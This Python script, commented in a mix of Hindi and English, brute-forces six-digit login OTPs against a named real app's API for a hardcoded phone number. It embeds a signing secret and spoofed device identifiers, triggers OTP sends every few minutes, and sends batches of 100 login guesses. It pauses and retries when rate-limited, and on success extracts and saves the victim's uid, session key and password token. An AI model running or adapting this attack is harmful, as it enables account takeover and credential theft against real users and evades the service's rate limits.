import asyncio
import aiohttp
import hashlib
import json
import time
from urllib.parse import quote

# Configuration
BASE_URL = "https://clubhtp.alaclub.in/api.php"
SECRET_KEY = "751a276cae97ac29e91819106ebb62f0"
APP_VER = "5.0.0"

# Target Details (Main.py is value ko dynamically change karega)
PHONE_NUMBER = "7357580788"

# OTP Sender Config (PasswordOTP.py se liya gaya)
OTP_SID = "88ceb0ce80f72a67556e02d2fd06cb13"

# Requirement 2: Changed from 14400 (4 hours) to 240 (4 minutes)
RESEND_OTP_INTERVAL = 240  

# Rate Limiting Config
REQUESTS_PER_SECOND = 100
BATCH_SIZE = 100

# Requirement 1: 300 milliseconds (0.3 seconds) delay after every 100 requests
DELAY_BETWEEN_BATCHES = 1.0  

# Naya: Rate limit mile toh 5 minute (300 seconds) rukna
RATE_LIMIT_SLEEP = 300

# --- TIME CALCULATOR VARIABLES ---
start_time_global = time.time()
total_requests_sent = 0

async def generate_sign(action, ver, sid, payload):
    sorted_keys = sorted(payload.keys())
    sorted_param_str = "".join([f"{k}={payload[k]}" for k in sorted_keys])
    raw_str = f"{action}{sid}{ver}{sorted_param_str}"
    sign_str = f"{raw_str}{sid}{SECRET_KEY}"
    return hashlib.md5(sign_str.encode("utf-8")).hexdigest()

# Naya feature: otp_code pass kiya taaki response ke saath map kar saken
async def send_async_request(session, action, sid, payload, otp_code=None):
    payload["ts"] = int(time.time())
    signature = await generate_sign(action, APP_VER, sid, payload)
    
    param_json = json.dumps(payload, separators=(",", ":"))
    encoded_param = quote(param_json)

    url = (
        f"{BASE_URL}?action={action}&ver={APP_VER}&sid={sid}"
        f"&language=0&sign={signature}&param={encoded_param}"
    )

    headers = {
        "User-Agent": "okhttp/3.12.1",
        "Host": "clubhtp.alaclub.in",
    }

    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
            # Requirement 3: Capture exact raw text response before JSON parsing
            raw_text = await response.text()
            try:
                data = json.loads(raw_text)
            except json.JSONDecodeError:
                data = {"ret": -998, "msg": "Invalid JSON", "raw": raw_text}
            return {"otp_code": otp_code, "response": data, "raw_response": raw_text}
    except Exception as e:
        return {"otp_code": otp_code, "response": {"ret": -999, "msg": f"Error: {str(e)}"}, "raw_response": str(e)}

# Requirement 2 & Naya Logic: Script start hote hi OTP bhejega, fail hone par 5 sec rukkar wapas try karega
async def send_otp_periodically(session):
    otp_payload = {
        "channel_id": "2025224",
        "pname": "aplus",
        "rver": "3.0.9",
        "tel_no": PHONE_NUMBER,  # Ye main.py se update hone wale PHONE_NUMBER ko use karega
        "type": 100,
        "gaid": "782f2714-c560-4fb9-a5d2-be0bb525ad35",
        "phoneimei": "9e7c78a55282a19b",
    }
    
    first_run = True  # Naya variable: pehli baar bina wait kiye OTP bhejne ke liye
    
    while True:
        if not first_run:
            # Agar pehli baar nahi hai toh normal 4 minute (240 sec) ka wait karega
            print(f"\n[*] OTP Request ko 4 minute ({RESEND_OTP_INTERVAL} seconds) ke liye sleep kiya gaya hai...")
            await asyncio.sleep(RESEND_OTP_INTERVAL)
        
        # OTP Bhejne ki koshish
        otp_sent_successfully = False
        while not otp_sent_successfully:
            try:
                print("\n[*] Requesting OTP...")
                res = await send_async_request(session, "SignupCode", OTP_SID, otp_payload.copy())
                api_res = res.get("response", {})
                ret_code = api_res.get("ret")
                
                # Agar server ne success response diya (ret == 0)
                if ret_code == 0:
                    print(f"[+] OTP Sent Successfully! Response: {api_res}")
                    otp_sent_successfully = True
                    first_run = False  # Ab aage se 4 minute wala loop chalega
                else:
                    # Agar OTP fail ho gaya toh 5 sec wait karke wapas try karega
                    print(f"[-] OTP Failed to send! Server Msg: {api_res.get('msg')}")
                    print("[*] Pausing OTP testing for 5 seconds before retry...")
                    await asyncio.sleep(5)  # 5 second wait
                    
            except Exception as e:
                print(f"[-] Error sending OTP: {e}")
                print("[*] Pausing OTP testing for 5 seconds before retry...")
                await asyncio.sleep(5)  # 5 second wait
                # loop wapas chalenga jab tak successfully OTP nahi chala jata

async def brute_force_otp():
    global start_time_global, total_requests_sent
    login_action = "SendLogin"
    
    # CHANGE 1: PHONE_NUMBER ko target_number me le rahe hain (main.py isko update karega)
    target_number = PHONE_NUMBER 
    
    login_payload = {
        "tel_no": target_number,
        "code": "",
        "pwd": "",
        "logintype": 3,
        "cver": "1001",
        "cver_new": "1003",
        "rver": "3.0.9",
        "pname": "aplus",
        "channel_id": "2025224",
        "subchannel_id": 0,
        "m_brand": "vivo",
        "m_model": "V2338",
        "phonename": "V2338",
        "phonenos": "android",
        "os": "android",
        "screen_width": "2408",
        "screen_height": "1080",
        "phoneimei": "9e7c78a55282a19b",
        "gaid": "782f2714-c560-4fb9-a5d2-be0bb525ad35",
        "firebase_id": "c8fd33ba75a4a6bd440e3a763f7d740b",
        "net": "mobile",
        "vpn": 1,
        "crashmodel": 1,
        "uid": 0,
        "language": "en",
        "user_language": 0,
        "init_type": 0,
        "hasBigfun": 0,
        "pwdtoken": "",
        "pushid": "",
        "push_uid": "",
        "bdid": "",
        "appsflyer_id": "",
        "adjust_id": "",
        "third_info": "",
        "latitude": "",
        "longitude": "",
        "install": "",
        "os_device": "{}",
    }

    # Connection pool limit
    connector = aiohttp.TCPConnector(limit=BATCH_SIZE, force_close=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        print(f"[*] Starting Brute Force on {target_number}...")
        print(f"[*] Rate: {BATCH_SIZE} Requests Per Batch")
        print(f"[*] Batch Delay: {DELAY_BETWEEN_BATCHES} seconds")
        print(f"[*] Rate Limit Sleep: {RATE_LIMIT_SLEEP} seconds (5 minutes)")
        
        # OTP sender ko background task ke roop me start karen
        otp_background_task = asyncio.create_task(send_otp_periodically(session))
        
        rate_limit_count = 0
        tested_count = 0
        i = 710000  # Starting OTP
        
        try:
            while i < 1000000:
                tasks = []
                batch_start = i
                batch_end = min(i + BATCH_SIZE, 1000000)
                
                # Ek batch (100 OTPs) ke tasks create karen
                for j in range(batch_start, batch_end):
                    otp_code = f"{j:06d}"
                    login_payload["code"] = otp_code
                    task = asyncio.create_task(send_async_request(session, login_action, "0", login_payload.copy(), otp_code))
                    tasks.append(task)
                
                batch_start_time = time.time() # Batch start time
                # 100 requests ka wait karenge
                results = await asyncio.gather(*tasks)
                batch_end_time = time.time() # Batch end time
                tasks = [] # Clear tasks for next batch
                
                rate_limit_hit = False
                
                for res in results:
                    tested_count += 1
                    total_requests_sent += 1
                    otp_used = res.get("otp_code")
                    api_res = res.get("response", {})
                    raw_server_res = res.get("raw_response", "")
                    
                    # Success Check
                    if api_res.get("ret") == 0:
                        print(f"\n\n[+] Login ho gaya hai.")
                        print(f"[✓] SUCCESS! OTP Found: {otp_used}")
                        print(f"[✓] Full Response: {api_res}")
                        
                        # Requirement 3: Output Logging - Append Mobile Number and Raw Server Response to Successful.txt
                        try:
                            with open("Successful.txt", "a+") as f:
                                f.write(f"{target_number} | {raw_server_res}\n")
                            print("[*] Mobile Number and Raw Response successfully appended to 'Successful.txt'")
                        except Exception as e:
                            print(f"[!] Error writing to Successful.txt: {e}")
                        
                        # Credentials Extract Karne ka Logic
                        try:
                            data = api_res.get('data', {})
                            uid = data.get('uid', 'N/A')
                            skey = data.get('skey', 'N/A')
                            pwdtoken = data.get('pwdtoken', 'N/A')
                            
                            print("\n" + "="*50)
                            print("       IMPORTANT CREDENTIALS EXTRACTED")
                            print("="*50)
                            print(f"UID      : {uid}")
                            print(f"skey     : {skey}")
                            print(f"pwdToken : {pwdtoken}")
                            print("="*50 + "\n")
                            
                            # Keeping old credential file logic intact
                            with open("success_result.txt", "w") as f:
                                f.write(f"OTP: {otp_used}\nUID: {uid}\nskey: {skey}\npwdToken: {pwdtoken}")
                            print("[*] Credentials successfully saved to 'success_result.txt'")
                            
                        except Exception as e:
                            print(f"[!] Error while extracting credentials: {e}")
                        
                        # --- TIME CALCULATOR FOR SUCCESS ---
                        total_time_taken = time.time() - start_time_global
                        print("\n" + "="*50)
                        print("           TIME CALCULATOR STATS")
                        print("="*50)
                        print(f"Total Requests Sent : {total_requests_sent}")
                        print(f"Total Time Taken    : {total_time_taken:.2f} seconds")
                        print(f"Average Speed       : {total_requests_sent / total_time_taken:.2f} req/sec")
                        print("="*50 + "\n")
                        
                        # CHANGE 2: 1 second ka sleep taaki file save ho jaye aur background task sahi se cancel ho
                        await asyncio.sleep(1)
                        return # Script stop kar do
                    
                    # Rate Limit / Block Check
                    if api_res.get("ret") == -999 or "limit" in str(api_res.get("msg", "")).lower():
                        print(f"\n[!] RATE LIMIT/BLOCKED! Server Msg: {api_res.get('msg')}")
                        rate_limit_hit = True
                
                # Agar rate limit mila toh 5 minute ruk kar same batch se retry
                if rate_limit_hit:
                    rate_limit_count += 1
                    print(f"\n[!] Rate limit detected on batch starting OTP: {batch_start:06d}")
                    print(f"[!] Total rate limit hits so far: {rate_limit_count}")
                    if rate_limit_count > 20: # Agar 20 baar limit lage toh stop
                        print("[!] Server is blocking continuously. Stopping test.")
                        return
                    
                    print(f"[*] Pausing script for {RATE_LIMIT_SLEEP} seconds (5 minutes)...")
                    print(f"[*] After pause, will RETRY from same OTP: {batch_start:06d}")
                    
                    # 5 minute (300 seconds) sleep
                    await asyncio.sleep(RATE_LIMIT_SLEEP)
                    
                    print(f"\n[*] 5 minute pause complete. Resuming from OTP: {batch_start:06d}")
                    # i ko advance nahi karenge, taaki same batch se retry ho
                    continue
                
                # Agar rate limit nahi mila toh next batch pe jayenge
                i = batch_end
                
                # --- TIME CALCULATOR FOR 1 MILLION ---
                batch_duration = batch_end_time - batch_start_time
                current_rps = BATCH_SIZE / (batch_duration + DELAY_BETWEEN_BATCHES) if batch_duration > 0 else 0
                
                # Calculate time for 1 million requests based on current speed
                time_for_1m_sec = 1000000 / current_rps if current_rps > 0 else 0
                
                # Convert seconds to Hours, Minutes, Seconds
                hrs = int(time_for_1m_sec // 3600)
                mins = int((time_for_1m_sec % 3600) // 60)
                secs = int(time_for_1m_sec % 60)
                
                print(f"[*] Tested {tested_count} combinations | Current Speed: {current_rps:.1f} req/s | Est. Time for 1 Million: {hrs}h {mins}m {secs}s", end="\r")

                # Requirement 1: Pause execution for 300 milliseconds (0.3 seconds) after every batch
                await asyncio.sleep(DELAY_BETWEEN_BATCHES)

        finally:
            # Jab brute force khatam ho jaye ya sahi OTP mil jaye, toh background task cancel kar denge
            otp_background_task.cancel()

if __name__ == "__main__":
    import os
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
    asyncio.run(brute_force_otp())